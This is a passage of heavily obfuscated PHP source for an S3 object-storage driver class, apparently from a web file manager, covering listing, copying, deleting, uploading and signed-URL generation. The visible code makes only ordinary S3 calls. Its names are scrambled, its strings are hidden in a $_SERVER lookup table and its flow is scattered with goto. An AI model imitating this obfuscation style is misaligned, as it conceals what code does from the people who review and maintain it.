explode($d¸Ü¥Ä¾Ï—[8], trim($E°ˆ—¨¢†, $d¸Ü¥Ä¾Ï—[8])); $fÀŒİ‡ç = 0; do { ++$fÀŒİ‡ç; $dê·¸òÌ£Í[] = implode($d¸Ü¥Ä¾Ï—[8], array_slice($E¿¸¦ ·”, 0, $fÀŒİ‡ç)) . $d¸Ü¥Ä¾Ï—[8]; } while ($fÀŒİ‡ç < count($E¿¸¦ ·”)); $dê·¸òÌ£Í[count($E¿¸¦ ·”) - 1] = $E°ˆ—¨¢†; return $dê·¸òÌ£Í; } public function getHost() { $díñòÔÀ¹Ú =& $_SERVER[¢Í]; $d¸ôÀÛë„… = parse_url(trim($this->domain, $díñòÔÀ¹Ú[8])); $Bº¿İÑò˜Â = isset($d¸ôÀÛë„…[$díñòÔÀ¹Ú[182]]) ? $d¸ôÀÛë„…[$díñòÔÀ¹Ú[182]] : http_type(); $f‰âƒùê·‰ = isset($d¸ôÀÛë„…[$díñòÔÀ¹Ú[183]]) ? $d¸ôÀÛë„…[$díñòÔÀ¹Ú[183]] : $d¸ôÀÛë„…[$díñòÔÀ¹Ú[85]]; if (isset($d¸ôÀÛë„…[$díñòÔÀ¹Ú[184]])) { $f‰âƒùê·‰ .= $díñòÔÀ¹Ú[4] . $d¸ôÀÛë„…[$díñòÔÀ¹Ú[184]]; } return $Bº¿İÑò˜Â . $díñòÔÀ¹Ú[185] . $f‰âƒùê·‰; } public function pathEncode($bäÑœ÷²ˆƒ) { $a–ø‚¸ÜÉÔ =& $_SERVER[¢Í]; return str_replace($a–ø‚¸ÜÉÔ[186], $a–ø‚¸ÜÉÔ[8], rawurlencode($bäÑœ÷²ˆƒ)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\64"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public function __construct($d°Û…È´áí) { set_timeout(); require_once SDK_DIR . $_SERVER[¢Í][187]; parent::__construct(); $this->_init($d°Û…È´áí); } public function _init($eõ°Ú¡Çß) { foreach ($eõ°Ú¡Çß as $fê³èÜàËÁ => $C“Ï¦¯¬îÅ) { if (isset($this->{$fê³èÜàËÁ})) { $this->{$fê³èÜàËÁ} = $C“Ï¦¯¬îÅ; } } $this->endpoint = $eõ°Ú¡Çß[$_SERVER[¢Í][188]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($FŸÕğ©¥Š¾ = "\166\x34") { $this->signVer = $FŸÕğ©¥Š¾; $this->client->setSignatureVersion($FŸÕğ©¥Š¾); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto B˜î“ôŸ•; C”¿—ó°£: if ($c¥Û£‡Ù”É[$F‡ÆÕŸÊ‹É[189]] != $F‡ÆÕŸÊ‹É[190] || $c¥Û£‡Ù”É[$F‡ÆÕŸÊ‹É[191]] != $F‡ÆÕŸÊ‹É[190]) { return !1; } $eœ²ƒËŞÍÅ = array_map($F‡ÆÕŸÊ‹É[192], $c¥Û£‡Ù”É[$F‡ÆÕŸÊ‹É[193]]); if (!is_array($eœ²ƒËŞÍÅ)) { $eœ²ƒËŞÍÅ = array(); } goto DÑ÷Î¬³†£; DÑ÷Î¬³†£: $FŞŒæáìãÄ = array($F‡ÆÕŸÊ‹É[194], $F‡ÆÕŸÊ‹É[195], $F‡ÆÕŸÊ‹É[196], $F‡ÆÕŸÊ‹É[197], $F‡ÆÕŸÊ‹É[198]); $a‘¬ß‹Ô = array_diff($FŞŒæáìãÄ, $eœ²ƒËŞÍÅ); return empty($a‘¬ß‹Ô); goto eÁõæšîÛ…; B˜î“ôŸ•: $F‡ÆÕŸÊ‹É =& $_SERVER[¢Í]; $c¥Û£‡Ù”É = $this->getBucketCors(); if (!$c¥Û£‡Ù”É || !is_array($c¥Û£‡Ù”É)) { return !1; } goto C”¿—ó°£; eÁõæšîÛ…: } public function mkfile($Bó™¹ÙäÆ®, $béÛ¡‰ŞˆÈ = '', $Aº„Ã»Ğ = REPEAT_RENAME) { $c½«¬•…ğÆ = $this->setContent($Bó™¹ÙäÆ®, $béÛ¡‰ŞˆÈ); if ($c½«¬•…ğÆ !== !1) { return $this->getPathOuter($Bó™¹ÙäÆ®); } return !1; } public function mkdir($cÑ¯ŠÃùÎá, $EôÃÅ‚°ù¹ = REPEAT_SKIP) { if (empty($cÑ¯ŠÃùÎá)) { return !1; } if ($this->_isFolder($cÑ¯ŠÃùÎá)) { return $this->getPathOuter($cÑ¯ŠÃùÎá); } $bŞ¸¯ÅÇ‰³ = $this->setContent($cÑ¯ŠÃùÎá, $_SERVER[¢Í][33], !0); if ($bŞ¸¯ÅÇ‰³ !== !1) { return $this->getPathOuter($cÑ¯ŠÃùÎá); } return !1; } public function copyFile($dİÅ¿ë”É, $f¬Ô¸®ÇÃŒ, $Fí½¦±É» = array()) { $fçÓ‘˜š‘¶ =& $_SERVER[¢Í]; $fëòÊšù× = $this->objectMeta($dİÅ¿ë”É); if (!$fëòÊšù×) { return !1; } if ($fëòÊšù×[$fçÓ‘˜š‘¶[87]] <= 1024 * 1024 * 200) { $D¿’ ’ªøŸ = $this->client->copyObject($this->bucket, $dİÅ¿ë”É, $this->bucket, $f¬Ô¸®ÇÃŒ, $fçÓ‘˜š‘¶[199], $Fí½¦±É»); } else { $D¿’ ’ªøŸ = $this->client->multiCopyObject($this->bucket, $dİÅ¿ë”É, $this->bucket, $f¬Ô¸®ÇÃŒ, $Fí½¦±É»); } $D¿’ ’ªøŸ = $D¿’ ’ªøŸ ? $this->getPathOuter($f¬Ô¸®ÇÃŒ) : !1; return $D¿’ ’ªøŸ; } public function moveFile($fÖŞ“®Ú¨±, $B‘æˆĞàõ) { if ($this->copyFile($fÖŞ“®Ú¨±, $B‘æˆĞàõ)) { $this->delFile($fÖŞ“®Ú¨±); return $this->getPathOuter($B‘æˆĞàõ); } return !1; } public function delFile($d¼ÈìÖ“Š†) { return $this->client->deleteObject($this->bucket, $d¼ÈìÖ“Š†); } public function delFolder($d¶ƒ‡ÖöæÇ) { goto eÔŸÒàÀÌ‘; eÔŸÒàÀÌ‘: $b–¸İ¢ÜèÉ =& $_SERVER[¢Í]; if (!$this->exist($d¶ƒ‡ÖöæÇ)) { return !0; } $this->listItemCache = !1; goto D¦‚‘ÂÉŠŞ; eßÀéÉàšÌ: if (!empty($d¶ƒ‡ÖöæÇ) && !in_array($B¢¹éì²ï„, $b§ˆ±î§‚Ó[$b–¸İ¢ÜèÉ[84]])) { $b§ˆ±î§‚Ó[$b–¸İ¢ÜèÉ[84]][] = $B¢¹éì²ï„; } $d„ù°±Š = $this->delByBatch($b§ˆ±î§‚Ó[$b–¸İ¢ÜèÉ[83]]); if (!$d„ù°±Š) { return !1; } goto FœÅ¨ÃØ‰–; D¦‚‘ÂÉŠŞ: $b§ˆ±î§‚Ó = $this->fileList($d¶ƒ‡ÖöæÇ); $this->listItemCache = !0; $B¢¹éì²ï„ = trim($d¶ƒ‡ÖöæÇ, $b–¸İ¢ÜèÉ[8]) . $b–¸İ¢ÜèÉ[8]; goto eßÀéÉàšÌ; FœÅ¨ÃØ‰–: return $this->delByBatch($b§ˆ±î§‚Ó[$b–¸İ¢ÜèÉ[84]]); goto D¦…óØ°—å; D¦…óØ°—å: } private function delByBatch($F¡Î©Îš) { foreach (array_chunk($F¡Î©Îš, 1000) as $d´©«ôÜğ) { $AêÉğ£ñ = $this->client->deleteObjects($this->bucket, $d´©«ôÜğ); if (!$AêÉğ£ñ) { return !1; } } return !0; } public function rename($cËËˆé£ËÕ, $Aãëƒ×ñî) { return $this->renameObject($cËËˆé£ËÕ, $Aãëƒ×ñî); } public function listPath($Fé¸É»ÌÚ, $D±ŠãÄŒ‡• = false) { $d–¬ƒ®Ú‚ =& $_SERVER[¢Í]; $A¹â§¥õ‚¡ = $this->fileList($Fé¸É»ÌÚ, $d–¬ƒ®Ú‚[8], !0); foreach ($A¹â§¥õ‚¡[$d–¬ƒ®Ú‚[84]] as $dæğõ¨˜ö£ => $Fóƒèö¹¡ğ) { $A¹â§¥õ‚¡[$d–¬ƒ®Ú‚[84]][$dæğõ¨˜ö£] = $this->folderInfo($Fóƒèö¹¡ğ, $D±ŠãÄŒ‡•); } foreach ($A¹â§¥õ‚¡[$d–¬ƒ®Ú‚[83]] as $dæğõ¨˜ö£ => $Fóƒèö¹¡ğ) { $A¹â§¥õ‚¡[$d–¬ƒ®Ú‚[83]][$dæğõ¨˜ö£] = $this->fileInfo($Fóƒèö¹¡ğ[$d–¬ƒ®Ú‚[28]], $D±ŠãÄŒ‡•, $Fóƒèö¹¡ğ); } return $A¹â§¥õ‚¡; } private function fileInfo($eæ•ÈîÈøÕ, $F•ø Ü„İŒ = false, $e¬ìäÚç• = array()) { goto d¢í“‘É„; B“ŠÂª«˜Ş: $cæåâ›ÍÔÓ[$aØéç‹ ·Š[200]] = $cæåâ›ÍÔÓ[$aØéç‹ ·Š[117]] = 0; $cæåâ›ÍÔÓ[$aØéç‹ ·Š[201]] = $cæåâ›ÍÔÓ[$aØéç‹ ·Š[202]] = !0; if (empty($e¬ìäÚç•)) { $e¬ìäÚç• = $this->objectMeta($eæ•ÈîÈøÕ); if (!$e¬ìäÚç•) { return $cæåâ›ÍÔÓ; } } goto eŒâ®š õÍ; eŒâ®š õÍ: if (isset($e¬ìäÚç•[$aØéç‹ ·Š[203]])) { $cæåâ›ÍÔÓ[$aØéç‹ ·Š[117]] = $e¬ìäÚç•[$aØéç‹ ·Š[203]]; } if (isset($e¬ìäÚç•[$aØéç‹ ·Š[87]])) { $cæåâ›ÍÔÓ[$aØéç‹ ·Š[87]] = $e¬ìäÚç•[$aØéç‹ ·Š[87]]; } return $cæåâ›ÍÔÓ; goto Bá£ÂÑ§§ê; d¢í“‘É„: $aØéç‹ ·Š =& $_SERVER[¢Í]; $cæåâ›ÍÔÓ = array($aØéç‹ ·Š[28] => $this->pathThis($eæ•ÈîÈøÕ), $aØéç‹ ·Š[85] => $this->getPathOuter($eæ•ÈîÈøÕ), $aØéç‹ ·Š[29] => $aØéç‹ ·Š[181], $aØéç‹ ·Š[175] => $this->ext($eæ•ÈîÈøÕ), $aØéç‹ ·Š[87] => isset($e¬ìäÚç•[$aØéç‹ ·Š[87]]) ? $e¬ìäÚç•[$aØéç‹ ·Š[87]] : 0); if ($F•ø Ü„İŒ) { return $cæåâ›ÍÔÓ; } goto B“ŠÂª«˜Ş; Bá£ÂÑ§§ê: } private function folderInfo($c×»™…¶×ë, $Eˆö‡…Üİ¿ = false) { goto EªçªùÉÒÒ; Cì›Ÿ·Ö„ò: $D³õŠš²¶î[$DÂÑÊ¼÷[200]] = $D³õŠš²¶î[$DÂÑÊ¼÷[117]] = 0; $D³õŠš²¶î[$DÂÑÊ¼÷[201]] = $D³õŠš²¶î[$DÂÑÊ¼÷[202]] = !0; if ($c×»™…¶×ë == $DÂÑÊ¼÷[33]) { return $D³õŠš²¶î; } goto E‹ãìùÁ––; E‹ãìùÁ––: $c×»™…¶×ë = trim($c×»™…¶×ë, $DÂÑÊ¼÷[8]) . $DÂÑÊ¼÷[8]; $AÁ­ ·ç°¯ = $this->objectMeta($c×»™…¶×ë); if (isset($AÁ­ ·ç°¯[$DÂÑÊ¼÷[203]])) { $D³õŠš²¶î[$DÂÑÊ¼÷[200]] = $AÁ­ ·ç°¯[$DÂÑÊ¼÷[203]]; } goto FÆ‘ˆì¸Õí; FÆ‘ˆì¸Õí: return $D³õŠš²¶î; goto b¬“ÇŒè¸; EªçªùÉÒÒ: $DÂÑÊ¼÷ =& $_SERVER[¢Í]; $D³õŠš²¶î = array($DÂÑÊ¼÷[28] => $this->pathThis($c×»™…¶×ë), $DÂÑÊ¼÷[85] => $this->getPathOuter($DÂÑÊ¼÷[8] . $c×»™…¶×ë), $DÂÑÊ¼÷[29] => $DÂÑÊ¼÷[86]); if ($Eˆö‡…Üİ¿) { return $D³õŠš²¶î; } goto Cì›Ÿ·Ö„ò; b¬“ÇŒè¸: } private function fileList($E®Õó­¸…, $CŒ™…¬‡« = '', $f¬Š¦­ªÜí = 0) { goto B¿ÒÀÀº³ª; B¸Èƒ¢ÇİÙ: if (!$B…Ç¸‚†°) { return array($a¦»«ŒÃñ[84] => array(), $a¦»«ŒÃñ[83] => array()); } $F˜ĞŸñ¥‡ = $this->listItemCache === !1 ? !1 : !0; $aÃƒ±öĞã‹ = $AĞô”“Ú = array(); goto E¹õ©ë­­ë; B¿ÒÀÀº³ª: $a¦»«ŒÃñ =& $_SERVER[¢Í]; $f´éÀ²”® = rtrim($E®Õó­¸…, $a¦»«ŒÃñ[8]) . $a¦»«ŒÃñ[8]; $B…Ç¸‚†° = $this->listObjs($f´éÀ²”®, null, null, $CŒ™…¬‡«); goto B¸Èƒ¢ÇİÙ; E¹õ©ë­­ë: foreach ($B…Ç¸‚†°[$a¦»«ŒÃñ[204]] as $AœÀÄøç‘) { goto AÙ¤–ôƒÈ; AÙ¤–ôƒÈ: $aƒ·öÅÒ†Ñ = $AœÀÄøç‘[$a¦»«ŒÃñ[28]]; if ($aƒ·öÅÒ†Ñ == $f´éÀ²”®) { continue; } $d÷‡‡È®…á = isset($AœÀÄøç‘[$a¦»«ŒÃñ[87]]) ? $AœÀÄøç‘[$a¦»«ŒÃñ[87]] : 0; goto AÁ—¢ååÌ; CÕå«÷ŸÔ: $AĞô”“Ú[] = $f¬Š¦­ªÜí ? $AœÀÄøç‘ : $aƒ·öÅÒ†Ñ; goto d¬ÔŠ±Ç‚è; AÁ—¢ååÌ: $A±Ï±ğ¡×Ô = $d÷‡‡È®…á == 0 && substr($aƒ·öÅÒ†Ñ, strlen($aƒ·öÅÒ†Ñ) - 1, 1) == $a¦»«ŒÃñ[8] ? !0 : !1; if ($F˜ĞŸñ¥‡) { $this->cacheMethod($a¦»«ŒÃñ[205], $aƒ·öÅÒ†Ñ, $A±Ï±ğ¡×Ô); $this->cacheMethod($a¦»«ŒÃñ[206], $aƒ·öÅÒ†Ñ, $AœÀÄøç‘); } if ($A±Ï±ğ¡×Ô) { $aÃƒ±öĞã‹[] = $aƒ·öÅÒ†Ñ; continue; } goto CÕå«÷ŸÔ; d¬ÔŠ±Ç‚è: } foreach ($B…Ç¸‚†°[$a¦»«ŒÃñ[207]] as $AœÀÄøç‘) { $aÃƒ±öĞã‹[] = $AœÀÄøç‘[$a¦»«ŒÃñ[28]]; if ($F˜ĞŸñ¥‡) { $this->cacheMethod($a¦»«ŒÃñ[205], $AœÀÄøç‘[$a¦»«ŒÃñ[28]], !0); } } if ($F˜ĞŸñ¥‡) { $this->cacheMethod($a¦»«ŒÃñ[205], $E®Õó­¸…, !0); } goto E˜¤ÛÅ«ß; E˜¤ÛÅ«ß: return array($a¦»«ŒÃñ[84] => $aÃƒ±öĞã‹, $a¦»«ŒÃñ[83] => $AĞô”“Ú); goto A¾¢ŠÕ•ğÏ; A¾¢ŠÕ•ğÏ: } private function listObjs($F„¹˜ó´¨÷, $b«Æä¦§‡Î = null, $AÜÛè¬È = null, $fİÌ˜¬ƒ• = null) { $Aˆœ°øŸÜÓ =& $_SERVER[¢Í]; $F„¹˜ó´¨÷ = trim($F„¹˜ó´¨÷, $Aˆœ°øŸÜÓ[8]); $a¶—ÄÖĞ¶å = empty($F„¹˜ó´¨÷) ? $Aˆœ°øŸÜÓ[33] : $F„¹˜ó´¨÷ . $Aˆœ°øŸÜÓ[8]; return $this->client->getBucket($this->bucket, $a¶—ÄÖĞ¶å, $b«Æä¦§‡Î, $AÜÛè¬È, $fİÌ˜¬ƒ•, !0); } public function has($DÀíÄĞ…¿œ, $f³êÊ‰Õãº = false, $b¿±±ëĞ¿Ù = true) { goto A†¿ç¥­­¡; d¯ªà¦Ïíš: $B¶ñ×©§Ó‹ = null; $Bœö±‘­å¨ = 500; $F¥ÙÏŒî‘ = $AŠà‡Ä–½Í[8]; goto F†ƒ­ËĞ¤; aÇŒ‰À¬ºÊ: return !1; goto FÑ‡Ìë¨; F†ƒ­ËĞ¤: $EøïÏØã = $c¿‰æ­ğ¦ = array(); while (!0) { $B‘Û‘¹ñÍ = $this->listObjs($DÀíÄĞ…¿œ, $B¶ñ×©§Ó‹, $Bœö±‘­å¨, $F¥ÙÏŒî‘); if (!$B‘Û‘¹ñÍ) { break; } $B¶ñ×©§Ó‹ = $B‘Û‘¹ñÍ[$AŠà‡Ä–½Í[208]]; $B†Ÿ³¿Ì = $B‘Û‘¹ñÍ[$AŠà‡Ä–½Í[204]]; $FîŒï‰–Ğ = $B‘Û‘¹ñÍ[$AŠà‡Ä–½Í[207]]; if (empty($B†Ÿ³¿Ì) && empty($FîŒï‰–Ğ)) { break; } if (count($B†Ÿ³¿Ì) == 1 && $B†Ÿ³¿Ì[0][$AŠà‡Ä–½Í[28]] == $E¡°èñĞõ) { break; } if ($f³êÊ‰Õãº) { if (count($B†Ÿ³¿Ì)) { $B†Ÿ³¿Ì = array_column($B†Ÿ³¿Ì, $AŠà‡Ä–½Í[28]); $EøïÏØã = array_merge($EøïÏØã, $B†Ÿ³¿Ì); } if (count($FîŒï‰–Ğ)) { $FîŒï‰–Ğ = array_column($FîŒï‰–Ğ, $AŠà‡Ä–½Í[28]); $c¿‰æ­ğ¦ = array_merge($c¿‰æ­ğ¦, $FîŒï‰–Ğ); } if ($B¶ñ×©§Ó‹ === null) { break; } continue; } if ($b¿±±ëĞ¿Ù) { if (!empty($B†Ÿ³¿Ì)) { if (count($B†Ÿ³¿Ì) > 1 || isset($B†Ÿ³¿Ì[0][$AŠà‡Ä–½Í[28]]) && $B†Ÿ³¿Ì[0][$AŠà‡Ä–½Í[28]] != $E¡°èñĞõ) { return !0; } } } else { if (!empty($FîŒï‰–Ğ)) { return !0; } } if ($B¶ñ×©§Ó‹ === null) { break; } } if ($f³êÊ‰Õãº) { $EøïÏØã = array_diff($EøïÏØã, array($E¡°èñĞõ)); $EøïÏØã = count(array_unique($EøïÏØã)); $c¿‰æ­ğ¦ = count(array_unique($c¿‰æ­ğ¦)); return array($AŠà‡Ä–½Í[209] => $EøïÏØã, $AŠà‡Ä–½Í[210] => $c¿‰æ­ğ¦); } goto aÇŒ‰À¬ºÊ; A†¿ç¥­­¡: $AŠà‡Ä–½Í =& $_SERVER[¢Í]; $DÀíÄĞ…¿œ = trim($DÀíÄĞ…¿œ, $AŠà‡Ä–½Í[8]); $E¡°èñĞõ = empty($DÀíÄĞ…¿œ) ? $AŠà‡Ä–½Í[33] : $DÀíÄĞ…¿œ . $AŠà‡Ä–½Í[8]; goto d¯ªà¦Ïíš; FÑ‡Ìë¨: } public function listAll($eä°¡Ä¥’™) { $Eİ©ùÉ¹‚¤ =& $_SERVER[¢Í]; $cí‡Ö×àÎ™ = $this->fileList($eä°¡Ä¥’™, $Eİ©ùÉ¹‚¤[33], !0); $eæªêŠÆİ = array(); foreach ($cí‡Ö×àÎ™[$Eİ©ùÉ¹‚¤[83]] as $BÒİ§Å™Œ¸) { $eæªêŠÆİ[$BÒİ§Å™Œ¸[$Eİ©ùÉ¹‚¤[28]]] = $BÒİ§Å™Œ¸[$Eİ©ùÉ¹‚¤[87]]; } foreach ($cí‡Ö×àÎ™[$Eİ©ùÉ¹‚¤[84]] as $BÒİ§Å™Œ¸) { if (is_string($BÒİ§Å™Œ¸)) { $eæªêŠÆİ[$BÒİ§Å™Œ¸] = 0; } } return $this->listAllFiles($eä°¡Ä¥’™, array_keys($eæªêŠÆİ), $eæªêŠÆİ); } public function canRead($fÅ®ÛäŠ‚À) { $Dœ¿í¯µ®À =& $_SERVER[¢Í]; $A•½±ç÷­æ = $this->client->getAccessControlPolicy($this->bucket, $fÅ®ÛäŠ‚À); if (!$A•½±ç÷­æ) { return !1; } return in_array($A•½±ç÷­æ, array($Dœ¿í¯µ®À[211], $Dœ¿í¯µ®À[212], $Dœ¿í¯µ®À[213])) ? !0 : !1; } public function canWrite($d×æÊ¶ÓõÍ) { $Fâø¥†Ë¢É =& $_SERVER[¢Í]; $b àÌ¨÷¯Â = $this->client->getAccessControlPolicy($this->bucket, $d×æÊ¶ÓõÍ); if (!$b àÌ¨÷¯Â) { return !1; } return in_array($b àÌ¨÷¯Â, array($Fâø¥†Ë¢É[211], $Fâø¥†Ë¢É[212])) ? !0 : !1; } public function getContent($D½«Œö…‘¡) { return $this->client->getObject($this->bucket, $D½«Œö…‘¡); } public function setContent($eÂ¢®ñßÍø, $dµÉÎ¿‚“… = '', $a­ÈŠ™Õ¨ö = false) { goto Föß°·Ã¾µ; dÜ‰Å¥È‹Î: $Bˆùğä×ÅÆ = $this->client->putObject($dµÉÎ¿‚“…, $this->bucket, $eÂ¢®ñßÍø, $e°§Ëöë‘ø[199], array(), $FğŒõ›šØ×); if (!$Bˆùğä×ÅÆ) { return !1; } if ($a­ÈŠ™Õ¨ö) { return !0; } goto Bä­øÇÊ; Bä­øÇÊ: $this->cacheMethod(null, null); $Bˆùğä×ÅÆ = $this->copyFile($eÂ¢®ñßÍø, $eÂ¢®ñßÍø, array($e°§Ëöë‘ø[214] => $Bˆùğä×ÅÆ[$e°§Ëöë‘ø[215]])); return $Bˆùğä×ÅÆ ? !0 : !1; goto d˜Öï›Î‰; Föß°·Ã¾µ: $e°§Ëöë‘ø =& $_SERVER[¢Í]; $eÂ¢®ñßÍø = $a­ÈŠ™Õ¨ö ? trim($eÂ¢®ñßÍø, $e°§Ëöë‘ø[8]) . $e°§Ëöë‘ø[8] : $eÂ¢®ñßÍø; $FğŒõ›šØ× = get_file_mime(get_path_ext($eÂ¢®ñßÍø)); goto dÜ‰Å¥È‹Î; d˜Öï›Î‰: } public function fileSubstr($EçóíÍµîÇ, $b°Î¶×µ¦, $BÉºİ¶•…) { $Eº’¾Î»ö = $b°Î¶×µ¦ + $BÉºİ¶•… - 1; return $this->client->getObject($this->bucket, $EçóíÍµîÇ, array($_SERVER[¢Í][216] => "\142\171\164\145\163\x3d{$b°Î¶×µ¦}\55{$Eº’¾Î»ö}")); } public function upload($bÇÌ³ùµİ, $A‡¸ø×¯ŸÏ, $eïÇ­§â = false, $eß´ÑÌ©Š‘ = REPEAT_REPLACE) { $a‘†¾ßæ‡‰ =& $_SERVER[¢Í]; $Bİ—¾ÇšÀ¢ = array($a‘†¾ßæ‡‰[214] => @md5_file($A‡¸ø×¯ŸÏ)); $D‚åÇ±´³ = array($a‘†¾ßæ‡‰[217] => get_file_mime(get_path_ext($bÇÌ³ùµİ))); if (IO::size($A‡¸ø×¯ŸÏ) <= 1024 * 1024 * 200) { $B»í”‰ØÍå = $this->client->putObjectFile($A‡¸ø×¯ŸÏ, $this->bucket, $bÇÌ³ùµİ, $a‘†¾ßæ‡‰[199], $Bİ—¾ÇšÀ¢, $D‚åÇ±´³); return !empty($B»í”‰ØÍå) ? $this->getPathOuter($bÇÌ³ùµİ) : !1; } $bó§ˆ°Ñ÷ = $this->client->multiUploadObject($A‡¸ø×¯ŸÏ, $this->bucket, trim($bÇÌ³ùµİ, $a‘†¾ßæ‡‰[8]), $Bİ—¾ÇšÀ¢, $D‚åÇ±´³); return $bó§ˆ°Ñ÷ ? $this->getPathOuter($bÇÌ³ùµİ) : !1; } public function download($EˆË™¦Õ¯, $D´îƒªÃÙ§) { if (!@is_dir($this->pathFather($D´îƒªÃÙ§)) && !IO::mkdir($this->pathFather($D´îƒªÃÙ§))) { return !1; } $EùëÔ°ÛÙ = $this->client->getObject($this->bucket, $EˆË™¦Õ¯, array(), $D´îƒªÃÙ§); return $EùëÔ°ÛÙ !== !1 ? $D´îƒªÃÙ§ : !1; } public function link($f±éÒßÂ¿à, $CÈ¹È—•·é = array()) { $fÉøöœ¿Ì› =& $_SERVER[¢Í]; if ($this->signVer == $fÉøöœ¿Ì›[218]) { return $this->client->getAuthenticatedURL($this->bucket, $f±éÒßÂ¿à, 3600 * 12, $CÈ¹È—•·é); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($f±éÒßÂ¿à, $fÉøöœ¿Ì›[8]), 3600 * 12, $this->region, array(), !0, $CÈ¹È—•·é); } public function fileOut($cá›Ï¼â÷£, $eªÚê¦·Š = false, $bœ£§É¦Ó¸ = false, $C˜¦¾»ƒÓç = '') { goto f•äÂñÀŒç; f•äÂñÀŒç: $bÕæİ¤ë‘ß =& $_SERVER[¢Í]; if ($this->isFileOutServer()) { return $this->fileOutServer($cá›Ï¼â÷£, $eªÚê¦·Š, $bœ£§É¦Ó¸, $C˜¦¾»ƒÓç); } if (!$bœ£§É¦Ó¸) { $bœ£§É¦Ó¸ = $this->pathThis($cá›Ï¼â÷£); } goto b’±‰ÅÈß¼; EŠšó£”ƒæ: $aİåˆ½äëÚ = array($bÕæİ¤ë‘ß[222] => $eªÚê¦·Š . $bÕæİ¤ë‘ß[223] . rawurlencode($bœ£§É¦Ó¸), $bÕæİ¤ë‘ß[224] => $BŒÉÎ‰ÊÒÀ); $Bƒ‰¨œ¨ = $this->link($cá›Ï¼â÷£, $aİåˆ½äëÚ); $this->fileOutLink($Bƒ‰¨œ¨); goto dÑ°¥æ¶”; b’±‰ÅÈß¼: $BŒÉÎ‰ÊÒÀ = get_file_mime(get_path_ext($bœ£§É¦Ó¸)); if ($BŒÉÎ‰ÊÒÀ == $bÕæİ¤ë‘ß[219]) { return parent::fileOut($cá›Ï¼â÷£, $eªÚê¦·Š, $bœ£§É¦Ó¸, $C˜¦¾»ƒÓç); } $eªÚê¦·Š = $eªÚê¦·Š ? $bÕæİ¤ë‘ß[220] : $bÕæİ¤ë‘ß[221]; goto EŠšó£”ƒæ; dÑ°¥æ¶”: } public function fileOutServer($Cİ×ÉÈˆ¯­, $fñÛëÁŸàÃ = false, $BßöÛÓ—¿Ô = false, $bâ¯°µÛ°¯ = '') { parent::fileOut($Cİ×ÉÈˆ¯­, $fñÛëÁŸàÃ, $BßöÛÓ—¿Ô, $bâ¯°µÛ°¯); } public function fileOutImageServer($EÚ œ‡Å, $b×ÎªËà¤ô = 250) { parent::fileOutImage($EÚ œ‡Å, $b×ÎªËà¤ô); } public function hashMd5($CÖá—²—¨ø, $E¾œ÷ƒ©·¥ = '') { $Dì²ùæ¿° =& $_SERVER[¢Í]; $Dæœ‡© ‘½ = $this->objectMeta($CÖá—²—¨ø); if (!$Dæœ‡© ‘½) { return !1; } $E¾œ÷ƒ©·¥ = $E¾œ÷ƒ©·¥ ? $E¾œ÷ƒ©·¥ : _get($Dæœ‡© ‘½, $Dì²ùæ¿°[225]); $E¾œ÷ƒ©·¥ = $E¾œ÷ƒ©·¥ ? $E¾œ÷ƒ©·¥ : _get($Dæœ‡© ‘½, $Dì²ùæ¿°[215], $Dì²ùæ¿°[33]); return $E¾œ÷ƒ©·¥; } public function uploadFormData($a‘›ƒÎä†®, $BË‚¦Æˆö£ = 3600) { $EäÒÆ†ÖÆÙ =& $_SERVER[¢Í]; $a¡«¥ºß¿ß = $this->pathFather($a‘›ƒÎä†®); $b£èÄëàÚ¨ = $this->client->getHttpUploadPostParams($this->bucket, $a¡«¥ºß¿ß, $EäÒÆ†ÖÆÙ[199], $BË‚¦Æˆö£); return array_merge((array) $b£èÄëàÚ¨, array($EäÒÆ†ÖÆÙ[183] => $this->getHost())); } public function multiUploadFormData($FôªîŞ¦®É, $b¼Öäì£ïÀ = 3600) { $C«Õ³×­ =& $_SERVER[¢Í]; $CÔÔ±ÒÙ = gmdate($C«Õ³×­[226]); $Fï­¼‚‰™ = array(); $d¯ë¾›…îò = $this->client->getUploadId($this->bucket, $FôªîŞ¦®É, $Fï­¼‚‰™); if (!$d¯ë¾›…îò) { return !1; } return array($C«Õ³×­[227] => $d¯ë¾›…îò, $C«Õ³×­[183] => $this->getHost() . $C«Õ³×­[8] . $this->pathEncode($FôªîŞ¦®É), $C«Õ³×­[228] => $CÔÔ±ÒÙ, $C«Õ³×­[99] => $FôªîŞ¦®É); } public function multiUploadAuthData($aªÃõ‚´À, $FÏÈÏç‰¾™ = array()) { goto FòİÚáŸ‡³; e½ßà³ù¸§: $c±ë³ƒØ = array($Aâ»ÁÅ…™å[230], $Aâ»ÁÅ…™å[33], $Aâ»ÁÅ…™å[126], $Aâ»ÁÅ…™å[33], "\x78\x2d\141\x6d\172\55\144\141\164\x65\72{$C‡¿ÓÂ‰ö}", $Aâ»ÁÅ…™å[8] . $this->bucket . $Aâ»ÁÅ…™å[8] . $this->pathEncode($B©Ÿ§ä™–) . $AÎ÷„ÈŠ—¦); if (strpos($AÎ÷„ÈŠ—¦, $Aâ»ÁÅ…™å[231]) === 0) { $c±ë³ƒØ[0] = $Aâ»ÁÅ…™å[232]; } if (isset($FÏÈÏç‰¾™[$Aâ»ÁÅ…™å[233]]) && $FÏÈÏç‰¾™[$Aâ»ÁÅ…™å[233]] == $Aâ»ÁÅ…™å[234]) { $c±ë³ƒØ[0] = $Aâ»ÁÅ…™å[234]; } goto B’Œä‰íˆ; B’Œä‰íˆ: $BÇ®ª¹§—¤ = implode($Aâ»ÁÅ…™å[56], $c±ë³ƒØ); $F…‡ŒàÅç = base64_encode(hash_hmac($Aâ»ÁÅ…™å[235], $BÇ®ª¹§—¤, $this->secret, !0)); $D´ÉµŒ»Ñß = $Aâ»ÁÅ…™å[236] . $this->accessKey . $Aâ»ÁÅ…™å[4] . $F…‡ŒàÅç; goto CÃå™î”©Ø; AÌè³‰…µÅ: $B©Ÿ§ä™– = $FÏÈÏç‰¾™[$Aâ»ÁÅ…™å[99]]; 